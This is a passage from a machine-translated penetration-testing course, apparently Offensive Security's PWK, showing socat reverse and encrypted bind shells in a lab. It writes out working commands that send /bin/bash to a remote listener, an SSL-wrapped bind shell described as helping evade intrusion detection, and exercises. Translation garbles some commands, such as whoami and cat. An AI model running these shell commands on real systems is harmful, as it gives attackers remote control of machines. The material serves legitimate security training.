<div style="position:absolute;top:97823;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.3 Socat 反向壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一下使用 socat 的反向 shell。</font><font style="vertical-align: inherit;">首先，Bob 将在端口 443 上启动一个侦听器。为此，</font></font></nobr></div>
<div style="position:absolute;top:97880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他将提供</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d -d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项来增加详细程度（显示致命、错误、警告和通知）</font></font></nobr></div>
<div style="position:absolute;top:97900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">消息），</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP4-LISTEN:443</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在端口 443 上创建 IPv4 侦听器，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDOUT</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行连接</font></font></nobr></div>
<div style="position:absolute;top:97919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 套接字的标准输出 (STDOUT)：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:97954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat -d -d TCP4-LISTEN:443 STDOUT</font></font></font></b></nobr></div>
<div style="position:absolute;top:97971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">... socat[4388] N 正在听 AF=2 0.0.0.0:443</font></font></nobr></div>
<div style="position:absolute;top:97990;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 95 - 使用 socat 创建侦听器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，Alice 将使用 socat 的 EXEC 选项（类似于 Netcat </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项），它将执行</font></font></nobr></div>
<div style="position:absolute;top:98039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦建立远程连接，给定程序。</font><font style="vertical-align: inherit;">在这种情况下，Alice 将发送一个 /bin/bash</font></font></nobr></div>
<div style="position:absolute;top:98059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.0.22:443 上将</font><font style="vertical-align: inherit;">shell（带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EXEC:/bin/bash</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font><font style="vertical-align: inherit;">反向</font><font style="vertical-align: inherit;">到 Bob 的侦听套接字：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat TCP4:10.11.0.22:443 EXEC:/bin/bash</font></font></font></b></nobr></div>
<div style="position:absolute;top:98113;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 96 - 使用 socat 发送反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接后，Bob 可以从他的 socat 会话中输入命令，该命令将在 Alice 的</font></font></nobr></div>
<div style="position:absolute;top:98162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">... socat[4388] N 在 10.11.0.22:443 上接受来自 AF=2 10.11.0.4:54720 的连接</font></font></nobr></div>
<div style="position:absolute;top:98213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">... socat[4388] N 使用标准输出进行读写</font></font></nobr></div>
<div style="position:absolute;top:98230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">... socat[4388] N 使用 FD [4,4] 和 [1,1] 开始数据传输循环</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:98247;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:98281;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uid=1000(kali) gid=1000(kali) 组=1000(kali)</font></font></nobr></div>
<div style="position:absolute;top:98318;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 97 - 连接的反向 shell 的 socat 输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个很好的开始，我们已经讨论了一些重要的主题，但到目前为止我们所有的 socat 网络</font></font></nobr></div>
<div style="position:absolute;top:98366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动已明朗。</font><font style="vertical-align: inherit;">让我们来看看使用 socat 进行加密的基础知识。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:98401;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.4 Socat 加密绑定壳</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要将加密添加到绑定 shell，我们将依赖安全套接字层</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">85</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书。</font><font style="vertical-align: inherit;">这种水平</font></font></nobr></div>
<div style="position:absolute;top:98458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加密将有助于规避入侵检测系统 (IDS) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">86</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并有助于隐藏敏感信息</font></font></nobr></div>
<div style="position:absolute;top:98478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在收发的数据。</font></font></nobr></div>
<div style="position:absolute;top:98510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续以 Alice 和 Bob 为例，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">openssl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序创建一个自</font></font></nobr></div>
<div style="position:absolute;top:98530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用以下选项签署的证书：</font></font></nobr></div>
<div style="position:absolute;top:98563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:98563;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">req </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 发起一个新的证书签名请求</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:98631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">85 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Transport_Layer_Security</font></font></font></nobr></div>
<div style="position:absolute;top:98651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">86 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Intrusion_detection_system</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:98779;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="84"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 84 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:98812;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:99889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:99889;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:99889;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">84</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:98908;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-newkey </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 生成一个新的私钥</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:98937;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rsa:2048 </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：使用密钥长度为 2,048 位的 RSA 加密。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:98965;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-nodes </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 存储没有密码保护的私钥</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:98994;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-keyout </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 将密钥保存到文件</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:99022;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-x509 </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 输出自签名证书而不是证书请求</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:99050;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-days </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 以天为单位设置有效期</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:99079;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-out </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 将证书保存到文件</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们生成密钥，我们将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书及其私钥到一个文件中，我们将</font></font></nobr></div>
<div style="position:absolute;top:99131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最终用于加密我们的绑定外壳。</font></font></nobr></div>
<div style="position:absolute;top:99163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在将在 Alice 的机器上完成这个过程：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:99215;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 -out bind_shell.crt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成 2048 位 RSA 私钥</font></font></nobr></div>
<div style="position:absolute;top:99249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.....................+++</font></font></nobr></div>
<div style="position:absolute;top:99266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">......................................+++</font></font></nobr></div>
<div style="position:absolute;top:99283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将新的私钥写入“bind_shell.key”</font></font></nobr></div>
<div style="position:absolute;top:99300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----</font></font></nobr></div>
<div style="position:absolute;top:99317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您将被要求输入将被纳入的信息</font></font></nobr></div>
<div style="position:absolute;top:99334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入您的证书请求。</font></font></nobr></div>
<div style="position:absolute;top:99351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您将要输入的是所谓的专有名称或 DN。</font></font></nobr></div>
<div style="position:absolute;top:99368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有很多字段，但你可以留一些空白</font></font></nobr></div>
<div style="position:absolute;top:99385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于某些字段，会有一个默认值，</font></font></nobr></div>
<div style="position:absolute;top:99402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您输入“.”，该字段将留空。</font></font></nobr></div>
<div style="position:absolute;top:99419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----</font></font></nobr></div>
<div style="position:absolute;top:99436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家/地区名称（2 个字母代码）[AU]：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">美国</font></font></font></b></nobr></div>
<div style="position:absolute;top:99453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">州或省名称（全名）[Some-State]：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Georgia</font></font></font></b></nobr></div>
<div style="position:absolute;top:99470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地点名称（例如，城市）[]：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">亚特兰大</font></font></font></b></nobr></div>
<div style="position:absolute;top:99487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织名称（例如，公司）[Internet Widgits Pty Ltd]：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Offsec</font></font></font></b></nobr></div>
<div style="position:absolute;top:99504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织单位名称（例如，部门）[]: </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Try Harder Department</font></font></font></b></nobr></div>
<div style="position:absolute;top:99521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通用名称（例如服务器 FQDN 或您的姓名）[]：</font></font></nobr></div>
<div style="position:absolute;top:99538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">电子邮件地址 []：</font></font></nobr></div>
<div style="position:absolute;top:99554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</font></font></font></b></nobr></div>
<div style="position:absolute;top:99574;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 98 - 设置 socat 加密</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">既然已经生成了密钥和证书，我们首先需要将它们转换为格式</font></font></nobr></div>
<div style="position:absolute;top:99623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat 会接受。</font><font style="vertical-align: inherit;">为此，我们将 bind_shell.key 和 bind_shell.crt 文件合并为一个</font></font></nobr></div>
<div style="position:absolute;top:99642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.pem 文件，然后再创建加密的 socat 侦听器。</font></font></nobr></div>
<div style="position:absolute;top:99675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OPENSSL-LISTEN</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项在端口 443 上创建侦听器，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cert=bind_shell.pem</font></font></font></b></nobr></div>
<div style="position:absolute;top:99694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定我们的证书文件，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">验证</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以禁用 SSL 验证，并</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fork</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以生成子进程</font></font></nobr></div>
<div style="position:absolute;top:99714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦与侦听器建立连接：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99748;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:99765;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bash</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99785;left:297"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 99 - 使用 socat 创建加密的绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，我们可以将 Bob 的计算机连接到 Alice 的绑定 shell。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:99967;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="85"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 85 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:100000;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:101077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:101077;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:101077;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">85</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDIO </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">87</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和远程主机</font><font style="vertical-align: inherit;">之间传输数据</font><font style="vertical-align: inherit;">，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OPENSSL</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建立远程</font></font></nobr></div>
<div style="position:absolute;top:100115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL 连接到 10.11.0.4:443 上 Alice 的侦听器，并且</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">verify=0</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以禁用 SSL 证书</font></font></nobr></div>
<div style="position:absolute;top:100135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确认：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat - OPENSSL:10.11.0.4:443,verify=0</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100186;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uid=1000(kali) gid=1000(kali) 组=1000(kali)</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100220;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:100257;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 100 - 使用 socat 连接到加密的绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">伟大的！</font><font style="vertical-align: inherit;">我们的绑定 shell 已成功创建，我们可以将命令传递给 Alice 的</font></font></nobr></div>
<div style="position:absolute;top:100305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:100338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花一些时间自己探索 socat。</font><font style="vertical-align: inherit;">这是众多工具中的一种</font></font></nobr></div>
<div style="position:absolute;top:100358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试期间有益。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100392;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.4.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将powercat.ps1从你的Kali机器传输到你的Windows系统。</font><font style="vertical-align: inherit;">保持</font></font></nobr></div>
<div style="position:absolute;top:100441;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统上的文件以在下一节中使用。</font></font></nobr></div>
<div style="position:absolute;top:100470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个从你的Windows系统到你的Kali的加密反向shell</font></font></nobr></div>
<div style="position:absolute;top:100489;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:100517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 在您的 Windows 系统上创建一个加密的绑定外壳。</font><font style="vertical-align: inherit;">尝试从 Kali 连接到它</font></font></nobr></div>
<div style="position:absolute;top:100537;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有加密。</font><font style="vertical-align: inherit;">它仍然有效吗？</font></font></nobr></div>
